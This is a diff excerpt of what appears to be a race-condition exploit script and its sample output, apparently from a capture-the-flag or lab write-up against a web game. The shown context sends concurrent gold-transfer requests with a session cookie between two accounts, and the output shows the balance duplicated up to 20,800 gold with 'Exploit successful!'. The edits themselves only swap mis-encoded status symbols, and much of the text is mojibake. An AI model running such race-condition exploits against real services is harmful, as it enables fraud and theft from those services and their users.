@@ -215,7 +215,7 @@ def transfer_gold(recipient, session_cookie, amount):
  
  # Execute all requests concurrently
  grequests.map(requests_list)
- print(f"{Fore.GREEN}[âœ“] Transfer completed!")
+ print(f"{Fore.GREEN}[â“] Transfer completed!")
 
 def execute_gold_race():
  """Orchestrate gold transfer sequence between accounts"""
@@ -241,7 +241,7 @@ def execute_gold_race():
  if current_gold > 0 and session_id:
  transfer_gold(receiver, session_id, current_gold)
  else:
- print(f"{Fore.RED}[âœ—] Skipping transfer - insufficient gold or invalid session")
+ print(f"{Fore.RED}[â—] Skipping transfer - insufficient gold or invalid session")
  
  cycle_count += 1
  
@@ -274,31 +274,31 @@ Target balance: 10,000 gold
 [ðŸ’°] acc1 balance: 1 gold
 
 [âž¤] Initiating transfer of 1 gold to acc2
-[âœ“] Transfer completed!
+[â“] Transfer completed!
 â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 [âš¡] Cycle #2: acc2 â†’ acc1
 [ðŸ’°] acc2 balance: 16 gold
 
 [âž¤] Initiating transfer of 16 gold to acc1
-[âœ“] Transfer completed!
+[â“] Transfer completed!
 â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 [âš¡] Cycle #3: acc1 â†’ acc2
 [ðŸ’°] acc1 balance: 160 gold
 
 [âž¤] Initiating transfer of 160 gold to acc2
-[âœ“] Transfer completed!
+[â“] Transfer completed!
 â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 [âš¡] Cycle #4: acc2 â†’ acc1
 [ðŸ’°] acc2 balance: 1600 gold
 
 [âž¤] Initiating transfer of 1600 gold to acc1
-[âœ“] Transfer completed!
+[â“] Transfer completed!
 â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 [âš¡] Cycle #5: acc1 â†’ acc2
 [ðŸ’°] acc1 balance: 20800 gold
 
 [âž¤] Initiating transfer of 20800 gold to acc2
-[âœ“] Transfer completed!
+[â“] Transfer completed!
 
 ðŸŽ‰ Exploit successful! Final balance: 20800 gold
 ```
